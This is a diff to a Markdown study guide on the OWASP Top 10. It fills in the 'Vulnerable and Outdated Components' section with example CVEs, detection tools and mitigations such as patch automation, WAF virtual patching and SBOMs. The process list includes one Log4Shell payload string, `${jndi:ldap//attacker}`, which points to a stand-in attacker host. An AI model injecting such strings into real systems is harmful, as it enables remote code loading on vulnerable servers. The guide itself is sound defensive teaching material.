@@ -168,17 +168,27 @@ Rate limiting (e.g., 5 login attempts/hour).
 - Use minimal CORS policies.
     - Configure your web server or application framework to set the `Access-Control-Allow/Origin, Headers` header with the specific allowed origins.
 
-## A6 - 
-- **Core Concept** 
+## A6 - Vulnerable and Outdated Components
+- **Core Concept** Known exploits in third-party libraries/services.
 - Process:
-    - 
-   
+    - Identify versions via `package.json` /HTTP headers.
+    - Exploit CVEs (e.g., Log4Shell: `${jndi:ldap//attacker}`)
 
-#### Finding - 
-   - **How to find**: 
-
-#### Mitigations -  
-
+| Type | Example |
+|---------|-----------|
+| Library Vulnerabilities| lodash prototype pollution (CVE-2020-8203) |
+| Server Vulnerabilities | Unpatched Jenkins/WordPress |
+#### Finding - Vulnerable and Outdated Components
+- Use OWASP Dependency-Check/Snyk.
+- Monitor CVE Databases
+   - **How to find**: SCA tools:Snyk, OWASP Dependency-Check.
+#### Mitigations - Vulnerable and Outdated Components 
+- Patch management automation.
+    - Automating the patching process ensures that security updates and patches are applied to your systems and applications consistently and efficiently.
+- Virtual patching via WAFs.
+    - Virtual patching leverages a Web Application Firewall (WAF) or Intrusion Prevention System (IPS) to detect and block attacks(exploit known vulnerabilities,) targeting specific vulnerabilities.
+- Maintain SBOM (Software Bill of Materials).
+    - A Software Bill of Materials (SBOM) is a comprehensive list of all software components used in a product, including open-source and proprietary components, their versions, and licenses.
 
 ## A7 - 
 - **Core Concept** 
